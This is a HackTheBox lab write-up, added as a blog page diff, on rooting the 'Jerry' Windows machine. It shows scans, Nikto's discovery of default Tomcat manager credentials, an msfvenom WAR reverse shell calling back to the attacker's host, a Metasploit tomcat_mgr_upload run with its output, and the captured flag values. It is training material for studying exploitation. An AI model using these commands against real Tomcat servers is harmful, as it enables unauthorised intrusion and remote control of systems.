@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Jerry HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Jerry box from HackTheBox">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Jerry HackTheBox - Write-Up</h1>
+          <p>Rooting the Jerry box from HackTheBox</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Jerry HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> July 29, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/"></a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/windows">Windows</a>
+								
+                , <a href="/tags/apache">Apache</a>
+								
+                , <a href="/tags/misconfiguration">Misconfiguration</a>
+								
+                , <a href="/tags/tty%20shell">Tty shell</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>This writeup will be my approach for pwning/rooting the HackTheBox machine called Jerry to obtain the user &amp; root flags. It is considered to be an easy machine and suitable for beginners.</p>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---initial-nmap-scan">Step 1 - Initial nmap scan</h3>
+<p>To start, nmap is used to scan for open TCP ports and identify the services running on Jerry. For a description of the specific switches used, take a look at my first article <a href="/blog/legacy/"><strong>Legacy</strong></a>.</p>
+<pre><code>student@teacher:~/hackthebox/Jerry$ nmap -T4 -Pn -n --min-rate=1000 --max-rate=5000 -p- --open 10.10.10.95
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 10:59 BST
+Nmap scan report for 10.10.10.95
+Host is up (0.031s latency).
+Not shown: 65534 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 94.57 seconds
+</code></pre><p>The scan shows that <code>8080</code> is the only open TCP port on Jerry - this could be of concern for me since my Burp Suite is configured for port 8080 through the localhost (127.0.0.1). If necessary Burp Suite will need to be configured for a different port not in use. If you find yourself in a similar situation, I found a discussion that explains how to address the issue.</p>
+<blockquote>
+<p><a href="https://forum.portswigger.net/thread/change-default-port-for-burp-enterprise-after-installation-859d3fd4"><code>https://forum.portswigger.net/thread/change-default-port-for-burp-enterprise-after-installation-859d3fd4</code></a></p>
+</blockquote>
+<p>For completeness, I want to do a scan for any UDP ports possibly used by Jerry. Up to this point I haven&rsquo;t had to scan for any UDP ports because nmap scans have always been TCP by default and all my targets thus far have only been using TCP. In order to scan for UDP I need to add the switch <code>-sU</code> as part of the final command.</p>
+<pre><code>student@teacher:~/hackthebox/Jerry$ sudo nmap -T4 -Pn -n -sU --min-rate=1000 --max-rate=5000 -p- --open 10.10.10.95
+[sudo] password for student: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 11:08 BST
+Nmap scan report for 10.10.10.95
+Host is up.
+All 65535 scanned ports on 10.10.10.95 are open|filtered
+</code></pre><p>Jerry isn&rsquo;t using any UDP ports for services which means I know for sure that there is only one TCP port (8080) being used.</p>
+<h3 id="step-2---aggressive-nmap-scan">Step 2 - Aggressive nmap scan</h3>
+<p>I will now do an aggressive scan on the &lsquo;http-proxy service&rsquo; running through port 8080 to find out what is REALLY happening in terms of service name, version number etc.</p>
+<pre><code>student@teacher:~/hackthebox/Jerry$ nmap -T4 -Pn -n -p 8080 -A -oA tcp_Aggressive_Jerry 10.10.10.95
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 11:19 BST
+Nmap scan report for 10.10.10.95
+Host is up (0.022s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
+</code></pre><p>The aggressive scan shows that the server on port 8080 is an Apache Tomcat server and a proxy server might be redirecting requests. The latter point can be checked out with Burp to identify where any requests are being redirected to.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<h3 id="step-1---access-http-server">Step 1 - Access HTTP server</h3>
+<p>I start my enumeration by accessing the HTTP server from a browser to see what information it may reveal.</p>
+<p><img src="/images/blog/jerry/snippet_4.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Jerry" /></p>
+<p>The IP address resolves to a web page with information regarding the Apache Tomcat server. Before doing any research of how the server works I will do a quick searchsploit for the Tomcat version used.</p>
+<h3 id="step-2---searchsploit-server">Step 2 - Searchsploit server</h3>
+<pre><code>student@teacher:~/hackthebox/Jerry$ searchsploit Apache Tomcat 7.0.88
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                  |  Path
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)    | windows/webapps/42953.txt
+Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)    | jsp/webapps/42966.py
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>This is a very promising result - a remote code execution exploit (RCE) that could be used to get a shell on Jerry.</p>
+<h3 id="step-3---research-server">Step 3 - Research server</h3>
+<p>I want to research the Tomcat server a bit more to ensure that the RCE exploit is the best path to follow. I was able find several Common Vulnerabilities and Exposures (CVEs) related to the server version.</p>
+<p><img src="/images/blog/jerry/snippet_6.png" width="100%" alt="HackTheBox Writeup by Chapl1n - CVE - Jerry" /></p>
+<p>Of the options, one that does stand out is entry one, <code>CVE-2019-0232</code>, a RCE that has a CVE score of 9.3. This information is very promising, but first, I decide to explore HTTP server&rsquo;s contents more.</p>
+<h3 id="step-4---tomcat-manager">Step 4 - Tomcat Manager</h3>
+<p>When I view the HTTP server from the browser, I see a lot of Tomcat server information. By getting an overview of how the server works, it could possibly provide me more insight on how to exploit it. Before proceeding straight to exploitation, I want to understand more about Tomcat in terms of what it does and how I could exploit it quickly and easily. There may be more than one exploit route, and it is always good to have multiple options available, just in case one does not work.</p>
+<p>Tomcat Manager is a web applicaiton server technology that can run &lsquo;Java Server Pages&rsquo; (JSPs) wrapped inside compressed containers called Web Application Resource (WAR) files. Tomcat has a management tool available in the &lsquo;manager&rsquo; subfolder, but it requires a username and password. If I can gain access to the manager facility, I could upload my own malicious WAR file that would result in a shell being gained on the target.</p>
+<p><img src="/images/blog/jerry/snippet_7.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Tomcat Manager - Jerry" /></p>
+<p><img src="/images/blog/jerry/snippet_8.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Tomcat Mananger Authentication - Jerry" /></p>
+<p>I have no idea what the credentials for the manager could be.</p>
+<h3 id="step-41---find-tomcat-manager-credentials">Step 4.1 - Find Tomcat Manager credentials</h3>
+<p>I did some research regarding this and attempted different combitnations for the username and password, but had no success. I didn&rsquo;t want to spend to much time just &ldquo;guessing&rdquo; them since this would take to long and brute forcing isn&rsquo;t the cleanest way of doing things. Eventually I remembered I could use the web server scanning tool <code>Nikto</code> to possibly find default credentials for me.</p>
+<h3 id="step-42---nikto-scan">Step 4.2 - Nikto scan</h3>
+<pre><code>student@teacher:~/hackthebox/Jerry$ sudo nikto -h 10.10.10.95 -p 8080
+[sudo] password for student: 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.95
++ Target Hostname:    10.10.10.95
++ Target Port:        8080
++ Start Time:         2020-07-27 14:34:52 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
++ /host-manager/html: Default Tomcat Manager / Host Manager interface found
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /manager/status: Tomcat Server Status interface found (pass protected)
++ 7968 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2020-07-27 14:40:56 (GMT1) (364 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre><p>Normally nikto scans use either TCP 80 or 443, but in this case I had to use the <code>-p</code> switch with a value of 8080 to specify the correct port number. When the scan was completed I was initially a bit underwhelmed by the results returned, until I noticed one particular disclosure.</p>
+<pre><code>+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+</code></pre><p>The Nikto scan was able to find default credentials for the manager - and they work!</p>
+<p><img src="/images/blog/jerry/snippet_11.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Accessed Tomcat Manager - Jerry" /></p>
+<p><img src="/images/blog/jerry/snippet_12.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Accessed Tomcat Manager - Deploy - Jerry" /></p>
+<p>I now have access to the Tomcat Application Manager. The second screenshot of the manager is what really interests me, as it is possible to upload WAR files. This is where I can specify my own custom payload to gain a shell on the target.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h3 id="step-1---create-reverse-shell-payload">Step 1 - Create reverse shell payload</h3>
+<p>I will use the tool <code>Msfvenom</code> to create a reverse shell WAR-based payload. More information on how to use msfvenom to create malicious WAR files can be found at the following:</p>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/shells/shells/untitled#war"><code>https://book.hacktricks.xyz/shells/shells/untitled#war</code></a></p>
+</blockquote>
+<pre><code>student@teacher:~/hackthebox/Jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.195 LPORT=4444 -f war &gt; reverse.war
+Payload size: 1087 bytes
+Final size of war file: 1087 bytes
+</code></pre><p>The reverse shell payload is created but before I deploy it to Tomcat manager, I will set up the listener on my Kali attack box.</p>
+<h3 id="step-2---create-listener">Step 2 - Create listener</h3>
+<pre><code>student@teacher:~/hackthebox/Jerry$ nc -nlvp 4444
+listening on [any] 4444 ...
+</code></pre><p>With the listener in place I can deploy and execute the reverse shell to receive a connection.</p>
+<h3 id="step-3---deploy-and-execute-reverse-shell">Step 3 - Deploy and execute reverse shell</h3>
+<p><img src="/images/blog/jerry/snippet_15.png" width="100%" alt="HackTheBox Writeup by Chapl1n - WAR File - Reverse Shell - Jerry" /></p>
+<p><img src="/images/blog/jerry/snippet_16.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Applications - Reverse Shell - Jerry" /></p>
+<p>Now that the file has been deployed, it is listed as an application in the manager. I will access it via the web browser to hopefully have the reverse shell established.</p>
+<p><img src="/images/blog/jerry/snippet_17.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Reverse Shell - Jerry" /></p>
+<h3 id="step-4---reverse-shell-gained">Step 4 - Reverse shell gained</h3>
+<pre><code>student@teacher:~/hackthebox/Jerry$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.195] from (UNKNOWN) [10.10.10.95] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;
+</code></pre><p>The shell has been established and I now have access to Jerry&rsquo;s file system</p>
+<h1 id="post-exploitation"><strong>Post Exploitation</strong></h1>
+<h3 id="step-1---check-current-privilege-levels">Step 1 - Check current privilege levels</h3>
+<p>I have a shell in a system and the first thing I do is check my current privilege levels. If I am not an administrator, privilege escalation (<code>privesc</code>) will be needed to gain complete access over the target and get the required flags.</p>
+<pre><code>C:\apache-tomcat-7.0.88&gt;whoami
+whoami
+nt authority\system
+</code></pre><p>My job just got a lot easier, <code>nt authority\system</code> is the highest level of authority within a Windows computer and I therefore do not require any privesc.</p>
+<h3 id="step-2---enumerate-file-system">Step 2 - Enumerate file system</h3>
+<p>I need to find the user and root flags in Jerry but before I do that, I need to get to the base of the file system.</p>
+<pre><code>C:\apache-tomcat-7.0.88&gt;cd C:\
+cd C:\
+</code></pre><p>Now that I am at the base of the file system I will check what is in my current working directory.</p>
+<pre><code>C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\
+
+06/19/2018  04:07 AM    &lt;DIR&gt;          apache-tomcat-7.0.88
+08/22/2013  06:52 PM    &lt;DIR&gt;          PerfLogs
+06/19/2018  06:42 PM    &lt;DIR&gt;          Program Files
+06/19/2018  06:42 PM    &lt;DIR&gt;          Program Files (x86)
+06/18/2018  11:31 PM    &lt;DIR&gt;          Users
+06/19/2018  06:54 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  27,603,210,240 bytes free
+</code></pre><p>There are several directories at the base of the file system, I suspect from the previous machines that the flags are within the <code>Users</code> folder.</p>
+<pre><code>C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users
+
+06/18/2018  11:31 PM    &lt;DIR&gt;          .
+06/18/2018  11:31 PM    &lt;DIR&gt;          ..
+06/18/2018  11:31 PM    &lt;DIR&gt;          Administrator
+08/22/2013  06:39 PM    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  27,603,210,240 bytes free
+</code></pre><p>In the <code>Users</code> folder I find the <code>Administrator</code> and <code>Public</code> folders - these likely hold the user and root flags.</p>
+<pre><code>C:\Users\Administrator\Desktop\flags&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    &lt;DIR&gt;          .
+06/19/2018  07:09 AM    &lt;DIR&gt;          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,603,210,240 bytes free
+</code></pre><p>In the Administrator\Destkop folder I can see a text file called <code>2 for the price of 1</code>. Perhaps this file contains both flags.</p>
+<pre><code>C:\Users\Administrator\Desktop\flags&gt;more &quot;2 for the price of 1.txt&quot;
+more &quot;2 for the price of 1.txt&quot;
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+</code></pre><p>I defintely got two for the price of one from this file. I submitted both values to HackTheBox and they were the flags I wanted.</p>
+<p>The job is technically (for me at least) not over yet. Having just completed the box manually, just for fun and awareness, let&rsquo;s try Metasploit.</p>
+<h1 id="with-metasploit"><strong>With Metasploit</strong></h1>
+<h3 id="step-1---find-exploit-module">Step 1 - Find exploit module</h3>
+<p>I am looking for any exploit modules related to Tomcat and I want my search to be somewhat vague so that I have the biggest pool of results to work with.</p>
+<pre><code>msf5 &gt; search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
+   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
+   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
+   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
+   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
+   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration
+</code></pre><p>From the results, entry 17 interests me the most since it will allow me to upload a file to the manager on Jerry.</p>
+<pre><code>msf5 &gt; use 17
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt;
+</code></pre><h3 id="step-2---configure-module">Step 2 - Configure module</h3>
+<p>The module is loaded and now needs to be configured to target Jerry.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.192    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+</code></pre><p>I already know the username and password for the manager, so these are supplied, even though they are not mandatory for the module.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword s3cret
+HttpPassword =&gt; s3cret
+</code></pre><pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername tomcat
+HttpUsername =&gt; tomcat
+</code></pre><p>I set the <code>RHOSTS</code> and <code>RPORTS</code> value to the IP address of Jerry and the port used by the HTTP server.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOSTS 10.10.10.95
+RHOSTS =&gt; 10.10.10.95
+</code></pre><pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 8080
+RPORT =&gt; 8080
+</code></pre><p>I set the <code>LHOST</code> value to the IP address of my attacking box to receive the connection.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set LHOST 10.10.16.195
+LHOST =&gt; 10.10.16.195
+</code></pre><p>Now that I have configured the module I will check it again to assure myself everything is in place.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  s3cret           no        The password for the specified username
+   HttpUsername  tomcat           no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        10.10.10.95      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT         8080             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.16.195     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+</code></pre><p><strong>Note:</strong> <code>LPORT</code> was already defined as 4444, so no need to supply it.</p>
+<h3 id="step-3---execute-payload">Step 3 - Execute payload</h3>
+<p>Everythinng looks good, so I execute the attack.</p>
+<pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.16.195:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying sritMU1k...
+[*] Executing sritMU1k...
+[*] Undeploying sritMU1k ...
+[*] Sending stage (53904 bytes) to 10.10.10.95
+[*] Meterpreter session 1 opened (10.10.16.195:4444 -&gt; 10.10.10.95:49194) at 2020-07-28 12:03:33 +0100
+
+meterpreter &gt;
+</code></pre><h3 id="step-4---create-tty-shell">Step 4 - Create TTY shell</h3>
+<p>The attack executes successfully and a meterpreter session is returned to my attacking box. The next stage for me is to create a TTY shell in order to access Jerry&rsquo;s file system.</p>
+<pre><code>meterpreter &gt; shell
+Process 1 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;
+</code></pre><h3 id="step-5---enumerate-file-system">Step 5 - Enumerate file system</h3>
+<p>I am in the same directory as I was when I executed the msfvenom payload to get my reverse shell. I will now travel to the flags directory with Administrators Desktop folder to grab the user and root flags.</p>
+<pre><code>C:\Users\Administrator\Desktop\flags&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    &lt;DIR&gt;          .
+06/19/2018  07:09 AM    &lt;DIR&gt;          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,603,001,344 bytes free
+</code></pre><pre><code>C:\Users\Administrator\Desktop\flags&gt;more &quot;2 for the price of 1.txt&quot;
+more &quot;2 for the price of 1.txt&quot;
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>After pwning Jerry I realise that the box itself was not that difficult. I did learn about the Tomcat Manager and its usages for the HTTP server, but more importantly, how to abuse misconfigurations in a system.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
